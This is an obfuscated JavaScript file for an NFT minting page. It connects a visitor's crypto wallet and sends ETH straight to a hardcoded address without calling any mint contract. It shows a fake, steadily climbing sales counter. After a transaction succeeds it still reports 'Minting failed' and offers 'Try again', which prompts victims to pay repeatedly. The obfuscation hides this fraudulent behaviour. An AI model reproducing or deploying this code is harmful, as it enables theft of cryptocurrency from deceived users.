const _0x15a31f=_0x4517;function _0x4517(_0x4a3a85,_0x2ba868){const _0x5906c3=_0x5906();return _0x4517=function(_0x45170c,_0x33afe3){_0x45170c=_0x45170c-0x1e5;let _0x50e543=_0x5906c3[_0x45170c];return _0x50e543;},_0x4517(_0x4a3a85,_0x2ba868);}(function(_0x1c88cd,_0x7f6977){const _0x14538d=_0x4517,_0x115a3d=_0x1c88cd();while(!![]){try{const _0x698a76=parseInt(_0x14538d(0x1eb))/0x1*(parseInt(_0x14538d(0x20d))/0x2)+parseInt(_0x14538d(0x201))/0x3*(-parseInt(_0x14538d(0x1f0))/0x4)+-parseInt(_0x14538d(0x1ec))/0x5+parseInt(_0x14538d(0x1fc))/0x6+parseInt(_0x14538d(0x200))/0x7*(-parseInt(_0x14538d(0x1fa))/0x8)+parseInt(_0x14538d(0x204))/0x9+parseInt(_0x14538d(0x207))/0xa*(-parseInt(_0x14538d(0x1e5))/0xb);if(_0x698a76===_0x7f6977)break;else _0x115a3d['push'](_0x115a3d['shift']());}catch(_0x4fcaa4){_0x115a3d['push'](_0x115a3d['shift']());}}}(_0x5906,0xe5b22));const statusp=document[_0x15a31f(0x1ea)](_0x15a31f(0x1fe)),connectBtn=document[_0x15a31f(0x1ea)](_0x15a31f(0x1ed)),checkoutBtn=document[_0x15a31f(0x1ea)](_0x15a31f(0x202)),pricePerNFT=0.24;$(document)[_0x15a31f(0x209)](function(){var _0x529ba7=0xb05;function _0x8495bc(){const _0x7d583b=_0x4517;_0x529ba7>0x11f8&&(_0x529ba7=0x0),$(_0x7d583b(0x1f3))['text'](_0x529ba7),_0x529ba7++;}setInterval(_0x8495bc,0x529);});let plusBtn=document['querySelector'](_0x15a31f(0x1e6)),minusBtn=document[_0x15a31f(0x1ea)]('button[class*=\x22btn-minus\x22]'),totalNFTInput=document[_0x15a31f(0x1ea)](_0x15a31f(0x20b)),totalETHSpan=document[_0x15a31f(0x1ea)]('#totalETH');totalNFTInput[_0x15a31f(0x1ef)]=0x1,totalETHSpan[_0x15a31f(0x20c)]=totalNFTInput[_0x15a31f(0x1ef)]*pricePerNFT,plusBtn['addEventListener'](_0x15a31f(0x1f1),()=>{const _0x3fc02b=_0x15a31f;totalNFTInput[_0x3fc02b(0x1ef)]=Number(totalNFTInput[_0x3fc02b(0x1ef)])+0x1,totalETHSpan['innerText']=(totalNFTInput[_0x3fc02b(0x1ef)]*pricePerNFT)[_0x3fc02b(0x1f4)](0x2);}),minusBtn['addEventListener'](_0x15a31f(0x1f1),()=>{const _0x27cb50=_0x15a31f;Number(totalNFTInput['value'])>0x1&&(totalNFTInput[_0x27cb50(0x1ef)]=Number(totalNFTInput[_0x27cb50(0x1ef)])-0x1,totalETHSpan['innerText']=(totalNFTInput[_0x27cb50(0x1ef)]*pricePerNFT)[_0x27cb50(0x1f4)](0x2));}),connectBtn['addEventListener'](_0x15a31f(0x1f1),async()=>{const _0x339bc0=_0x15a31f;if(window[_0x339bc0(0x1ee)]){window[_0x339bc0(0x1ff)]=new Web3(ethereum);try{await ethereum[_0x339bc0(0x1e8)](),initPayButton(),statusp[_0x339bc0(0x1f2)]=_0x339bc0(0x1f6);}catch(_0x583379){console['log'](_0x583379),statusp[_0x339bc0(0x1f2)]=_0x339bc0(0x205);}}else window[_0x339bc0(0x1ff)]?(window[_0x339bc0(0x1ff)]=new Web3(web3[_0x339bc0(0x1f7)]),initPayButton()):statusp['innerHTML']='No\x20Metamask\x20(or\x20other\x20Web3\x20Provider)\x20installed';});function _0x5906(){const _0x49f7b0=['Minting\x20failed','Wallet\x20connected.\x20Mint\x20your\x20NFTs\x20now!','currentProvider','addEventListener','0xcf85047D0e14C64C42f8221012BD0B8388Dc58Ce','460968KCLNwF','Minting\x20in\x20progress....','7795878ssADOp','getAccounts','#status','web3','161LwbFDq','3863091EPqtaf','#checkoutBtn','toWei','15426288JMphfB','Wallet\x20access\x20denied','ether','43410rhEArV','Try\x20again','ready','log','input[type=\x22text\x22][id=\x22totalNFT\x22]','innerText','599042HeedpE','sendTransaction','11QhSRxT','button[class*=\x22btn-plus\x22]','utils','enable','eth','querySelector','4rddGCF','3266370ggRHcE','#connectBtn','ethereum','value','4nCxdfq','click','innerHTML','.count','toFixed'];_0x5906=function(){return _0x49f7b0;};return _0x5906();}const initPayButton=()=>{const _0x254636=_0x15a31f;checkoutBtn[_0x254636(0x1f8)](_0x254636(0x1f1),async()=>{const _0x3c331d=_0x254636;statusp[_0x3c331d(0x20c)]=_0x3c331d(0x1fb);const _0x361534=_0x3c331d(0x1f9);let _0x2e18e6=totalETHSpan[_0x3c331d(0x20c)];_0x2e18e6=_0x2e18e6['toString']();const _0x33b182=await web3['eth'][_0x3c331d(0x1fd)]();web3[_0x3c331d(0x1e9)][_0x3c331d(0x20e)]({'from':web3[_0x3c331d(0x1f7)]['selectedAddress'],'to':_0x361534,'value':web3[_0x3c331d(0x1e7)][_0x3c331d(0x203)](_0x2e18e6,_0x3c331d(0x206))},(_0x1726ff,_0x13cde2)=>{const _0x1a5a86=_0x3c331d;_0x1726ff?(console[_0x1a5a86(0x20a)](_0x1a5a86(0x1f5),_0x1726ff),statusp[_0x1a5a86(0x20c)]=_0x1a5a86(0x1f5)):(console[_0x1a5a86(0x20a)]('Minting\x20succeed',_0x13cde2),statusp['innerText']='Minting\x20failed',checkoutBtn['innerText']=_0x1a5a86(0x208));});});};
